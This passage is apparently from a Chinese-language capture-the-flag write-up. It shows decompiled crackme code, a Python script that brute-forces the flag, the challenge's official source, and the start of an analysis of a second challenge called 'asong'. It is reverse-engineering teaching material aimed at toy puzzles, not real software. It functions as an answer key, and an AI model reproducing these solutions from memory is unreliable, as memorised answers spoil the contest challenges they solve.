class="comment">//</span></span><br><span class="line"><span class="comment">// This file was generated by the Retargetable Decompiler</span></span><br><span class="line"><span class="comment">// Website: https://retdec.com</span></span><br><span class="line"><span class="comment">// Copyright (c) 2019 Retargetable Decompiler &lt;info@retdec.com&gt;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ------------------- Function Prototypes --------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int32_t</span> <span class="built_in">puts</span>(<span class="keyword">char</span> * a1);</span><br><span class="line"><span class="keyword">int32_t</span> <span class="built_in">strlen</span>(<span class="keyword">char</span> * a1);</span><br><span class="line"><span class="keyword">int32_t</span> <span class="built_in">strncmp</span>(<span class="keyword">char</span> * a1, <span class="keyword">char</span> * a2, <span class="keyword">int32_t</span> a3);</span><br><span class="line"><span class="keyword">int32_t</span> sub_4007F0(<span class="keyword">char</span> * a1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// --------------------- Global Variables ---------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * g1 = <span class="string">"\x52\xfd\x16\xa4\x89\xbd\x92\x80\x13\x41\x54\xa0\x8d\x45\x18\x81\xde\xfc\x95\xf0\x16\x79\x1a\x15\x5b\x75\x1f"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ------------------------ Functions -------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Address range: 0x4007f0 - 0x4009a8</span></span><br><span class="line"><span class="keyword">int32_t</span> sub_4007F0(<span class="keyword">char</span> * a1) &#123;</span><br><span class="line">    <span class="keyword">int32_t</span> v1 = (<span class="keyword">int32_t</span>)a1; <span class="comment">// 0x400800</span></span><br><span class="line">    <span class="keyword">char</span> * str = (<span class="keyword">char</span> *)v1; <span class="comment">// 0x400800</span></span><br><span class="line">    <span class="keyword">int32_t</span> puts_rc;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(str) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="comment">// 0x400934</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strncmp</span>((<span class="keyword">char</span> *)(v1 + <span class="number">5</span>), (<span class="keyword">char</span> *)&amp;g1, <span class="number">27</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 0x400964</span></span><br><span class="line">            puts_rc = <span class="built_in">puts</span>(<span class="string">"Right!"</span>);</span><br><span class="line">            <span class="comment">// branch -&gt; 0x40098c</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 0x40097c</span></span><br><span class="line">            puts_rc = <span class="built_in">puts</span>(<span class="string">"Wrong!"</span>);</span><br><span class="line">            <span class="comment">// branch -&gt; 0x40098c</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 0x40098c</span></span><br><span class="line">        <span class="keyword">return</span> puts_rc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int32_t</span> v2 = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">char</span> * v3 = (<span class="keyword">char</span> *)(v2 + v1); <span class="comment">// 0x4008a8</span></span><br><span class="line">        <span class="keyword">int32_t</span> v4 = (<span class="keyword">int32_t</span>)*v3; <span class="comment">// 0x4008a8</span></span><br><span class="line">        <span class="keyword">char</span> v5;</span><br><span class="line">        <span class="keyword">if</span> (v2 % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">char</span> v6 = *v3; <span class="comment">// 0x4008cc</span></span><br><span class="line">            v5 = (<span class="keyword">int32_t</span>)v6 / <span class="number">64</span> | <span class="number">0x4000000</span> * v4 / <span class="number">0x1000000</span>;</span><br><span class="line">            <span class="comment">// branch -&gt; 0x400900</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 0x400828</span></span><br><span class="line">            v5 = <span class="number">64</span> * (<span class="keyword">int32_t</span>)*v3 | v4 / <span class="number">4</span>;</span><br><span class="line">            <span class="comment">// branch -&gt; 0x400900</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 0x400900</span></span><br><span class="line">        *v3 = v5;</span><br><span class="line">        <span class="keyword">int32_t</span> v7 = v2 + <span class="number">1</span>; <span class="comment">// 0x400908</span></span><br><span class="line">        <span class="keyword">if</span> (v7 &gt;= <span class="built_in">strlen</span>(str)) &#123;</span><br><span class="line">            <span class="comment">// break -&gt; 0x400934</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v2 = v7;</span><br><span class="line">        <span class="comment">// continue -&gt; 0x400814</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0x400934</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strncmp</span>((<span class="keyword">char</span> *)(v1 + <span class="number">5</span>), (<span class="keyword">char</span> *)&amp;g1, <span class="number">27</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 0x400964</span></span><br><span class="line">        puts_rc = <span class="built_in">puts</span>(<span class="string">"Right!"</span>);</span><br><span class="line">        <span class="comment">// branch -&gt; 0x40098c</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 0x40097c</span></span><br><span class="line">        puts_rc = <span class="built_in">puts</span>(<span class="string">"Wrong!"</span>);</span><br><span class="line">        <span class="comment">// branch -&gt; 0x40098c</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0x40098c</span></span><br><span class="line">    <span class="keyword">return</span> puts_rc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --------------------- Meta-Information ---------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Detected compiler/packer: gcc (7.3.0)</span></span><br><span class="line"><span class="comment">// Detected functions: 1</span></span><br><span class="line"><span class="comment">// Decompilation date: 2019-01-23 16:29:29</span></span><br></pre></td></tr></table></figure>
<p>逻辑就是先判断奇偶，如果为奇数则将字符的高6位作为低6位，低2位作为高2位；反之为偶数，则字符的低6位作为高6位，高2位作为低2位。最后和<code>g1</code>check一下。</p>
<ul>
<li>main函数在这里：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This file was generated by the Retargetable Decompiler</span></span><br><span class="line"><span class="comment">// Website: https://retdec.com</span></span><br><span class="line"><span class="comment">// Copyright (c) 2019 Retargetable Decompiler &lt;info@retdec.com&gt;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ------------------- Function Prototypes --------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int32_t</span> <span class="built_in">printf</span>(<span class="keyword">char</span> * a1);</span><br><span class="line"><span class="keyword">int32_t</span> <span class="built_in">puts</span>(<span class="keyword">char</span> * a1);</span><br><span class="line"><span class="keyword">int32_t</span> <span class="built_in">scanf</span>(<span class="keyword">char</span> * a1);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setbuf</span><span class="params">(<span class="keyword">int32_t</span> a1, <span class="keyword">char</span> * a2)</span></span>;</span><br><span class="line"><span class="keyword">int32_t</span> <span class="built_in">strncmp</span>(<span class="keyword">char</span> * a1, <span class="keyword">char</span> * a2, <span class="keyword">int32_t</span> a3);</span><br><span class="line"><span class="keyword">int32_t</span> sub_4007F0(<span class="keyword">int32_t</span> a1);</span><br><span class="line"><span class="keyword">int32_t</span> sub_4009A8(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// --------------------- Global Variables ---------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int32_t</span> <span class="built_in">stdin</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int32_t</span> <span class="built_in">stdout</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ------------------------ Functions -------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Address range: 0x4009a8 - 0x400af8</span></span><br><span class="line"><span class="keyword">int32_t</span> sub_4009A8(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="comment">// 0x4009a8</span></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Give me your flag:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%32s"</span>);</span><br><span class="line">    <span class="keyword">int32_t</span> v1 = <span class="number">0</span>; <span class="comment">// bp-48</span></span><br><span class="line">    <span class="keyword">int32_t</span> v2 = <span class="number">0</span>; <span class="comment">// 0x400a58</span></span><br><span class="line">    <span class="keyword">char</span> * v3 = (<span class="keyword">char</span> *)((<span class="keyword">int32_t</span>)&amp;v1 + <span class="number">4</span> + v2); <span class="comment">// 0x400a28</span></span><br><span class="line">    *v3 = (<span class="keyword">char</span>)((<span class="keyword">int32_t</span>)*v3 ^ <span class="number">32</span> - v2);</span><br><span class="line">    <span class="keyword">int32_t</span> v4 = v1 + <span class="number">1</span>; <span class="comment">// 0x400a70</span></span><br><span class="line">    v1 = v4;</span><br><span class="line">    <span class="comment">// branch -&gt; 0x400a1c</span></span><br><span class="line">    <span class="keyword">while</span> (v4 &lt; <span class="number">32</span>) &#123;</span><br><span class="line">        <span class="comment">// 0x400a1c</span></span><br><span class="line">        v2 = v4;</span><br><span class="line">        v3 = (<span class="keyword">char</span> *)((<span class="keyword">int32_t</span>)&amp;v1 + <span class="number">4</span> + v2);</span><br><span class="line">        *v3 = (<span class="keyword">char</span>)((<span class="keyword">int32_t</span>)*v3 ^ <span class="number">32</span> - v2);</span><br><span class="line">        v4 = v1 + <span class="number">1</span>;</span><br><span class="line">        v1 = v4;</span><br><span class="line">        <span class="comment">// continue -&gt; 0x400a1c</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int32_t</span> str = <span class="number">0</span>; <span class="comment">// bp-44</span></span><br><span class="line">    <span class="keyword">int32_t</span> puts_rc;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strncmp</span>((<span class="keyword">char</span> *)&amp;str, <span class="string">"Q|j&#123;g"</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 0x400ab4</span></span><br><span class="line">        puts_rc = sub_4007F0((<span class="keyword">int32_t</span>)&amp;str);</span><br><span class="line">        <span class="comment">// branch -&gt; 0x400adc</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 0x400acc</span></span><br><span class="line">        puts_rc = <span class="built_in">puts</span>(<span class="string">"Wrong"</span>);</span><br><span class="line">        <span class="comment">// branch -&gt; 0x400adc</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0x400adc</span></span><br><span class="line">    <span class="keyword">return</span> puts_rc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --------------------- Meta-Information ---------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Detected compiler/packer: gcc (7.3.0)</span></span><br><span class="line"><span class="comment">// Detected functions: 1</span></span><br><span class="line"><span class="comment">// Decompilation date: 2019-01-23 16:29:58</span></span><br></pre></td></tr></table></figure>
<p>main中先输入字符串，然后将字符串中的每个字符依次与<code>32-i</code>异或，前五位与<code>Q|j{g</code>比较，之后将字符串作为参数调用上一个check函数。</p>
<p>由于之前的奇偶难以判断，所以采用爆破的方式。用python写出爆破脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">enc1 = <span class="string">'Q|j&#123;g'</span></span><br><span class="line">enc2 = <span class="string">'\x52\xfd\x16\xa4\x89\xbd\x92\x80\x13\x41\x54\xa0\x8d\x45\x18\x81\xde\xfc\x95\xf0\x16\x79\x1a\x15\x5b\x75\x1f'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    ch = ord(enc1[i]) ^ (<span class="number">32</span> - i)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'index'</span>, i, <span class="string">'==&gt;'</span>, chr(ch)</span><br><span class="line">    flag += chr(ch)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>, <span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        t = ch ^ (<span class="number">32</span> - i)</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            res = ((t &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0xff</span>) | (t &gt;&gt; <span class="number">6</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res = (t &gt;&gt; <span class="number">2</span>) | ((t &lt;&lt; <span class="number">6</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">        <span class="keyword">if</span> res == ord(enc2[i - <span class="number">5</span>]):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'index'</span>, i, <span class="string">'==&gt;'</span>, chr(ch)</span><br><span class="line">            flag += chr(ch)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> len(flag)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag:'</span>, flag</span><br></pre></td></tr></table></figure>
<p>最后放上官方给出的源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> *check1=<span class="string">"Q|j&#123;g"</span>;</span><br><span class="line"><span class="keyword">char</span> *check2= <span class="string">"\x52\xfd\x16\xa4\x89\xbd\x92\x80\x13\x41\x54\xa0\x8d\x45\x18\x81\xde\xfc\x95\xf0\x16\x79\x1a\x15\x5b\x75\x1f"</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">(<span class="keyword">char</span> *s)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">5</span>;i&lt;<span class="built_in">strlen</span>(s);i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(i%<span class="number">2</span>)</span><br><span class="line">			s[i]=(s[i]&gt;&gt;<span class="number">2</span>)|((s[i]&lt;&lt;<span class="number">6</span>)&amp;<span class="number">0xff</span>);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			s[i]=((s[i]&lt;&lt;<span class="number">2</span>)&amp;<span class="number">0xff</span>)|(s[i]&gt;&gt;<span class="number">6</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strncmp</span>(&amp;s[<span class="number">5</span>],check2,<span class="number">27</span>))</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Right!\n"</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Wrong!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> s[<span class="number">33</span>];</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Give me your flag:"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%32s"</span>,s);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">		s[i]^=(<span class="number">32</span>-i);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strncmp</span>(s,check1,<span class="number">5</span>))</span><br><span class="line">		check(s);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Wrong\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="asong"><a href="#asong" class="headerlink" title="asong"></a>asong</h2><p>总共给了三个文件，<code>asong</code>为可执行文件，<code>that_girl</code>以及<code>out</code>都是ascii文本。将<code>asong</code>拖进ida后，看到main函数的样子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *girl; <span class="comment">// ST00_8</span></span><br><span class="line">  <span class="keyword">char</span> *input; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  girl = <span class="built_in">malloc</span>(<span class="number">0xBC</span>uLL);</span><br><span class="line">  input = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x50</span>uLL);</span><br><span class="line">  init_func();</span><br><span class="line">  getline(input);</span><br><span class="line">  simple_check(input);</span><br><span class="line">  cal(<span class="string">"that_girl"</span>, (__int64)girl);</span><br><span class="line">  encrypt(input, (__int64)girl);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一个<code>init_func()</code>，设置一下缓冲区：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>getline()</code>函数实现了一个简单的读取一行的功能：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> __<span class="function">fastcall <span class="title">getline</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    LOBYTE(v1) = read(<span class="number">0</span>, &amp;a1[i], <span class="number">1u</span>LL) == <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(_BYTE)v1 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( a1[i] == <span class="number">10</span> || i &gt; <span class="number">100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = &amp;a1[i];</span><br><span class="line">      *v1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">char</span>)v1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">char</span>)v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>simple_check()</code>函数检查读入字符串中是否以<code>&#39;QCTF{&#39;</code>开头，以及是否以<code>&#39;}&#39;</code>结尾：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">simple_check</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *dest; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  dest = <span class="built_in">malloc</span>(<span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(a1, <span class="string">"QCTF&#123;"</span>, <span class="number">5u</span>LL) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, a1 + <span class="number">5</span>, <span class="number">0x4B</span>uLL);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)dest);</span><br><span class="line">  <span class="keyword">if</span> ( *((_BYTE *)dest + v1 - <span class="number">1</span>) == <span class="string">'&#125;'</span> )</span><br><span class="line">    *((_BYTE *)dest + v1 - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>(a1, dest, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">free</span>(dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>cal()</code>函数读取了文件<code>that_girl</code>的内容，应该是通过<code>convert()</code>函数对其中的每个字符做了一个词频的统计：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">cal</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *that_girl, __int64 girl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = open(that_girl, <span class="number">0</span>, girl, that_girl);</span><br><span class="line">  <span class="keyword">while</span> ( read(fd, &amp;buf, <span class="number">1u</span>LL) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = convert(buf);</span><br><span class="line">    ++*(_DWORD *)&amp;v4[<span class="number">4</span> * v2];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>convert()</code>函数中是一个对读入的buf的映射，不用刻意看具体是什么操作，后面直接打表就完事了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">convert</span><span class="params">(<span 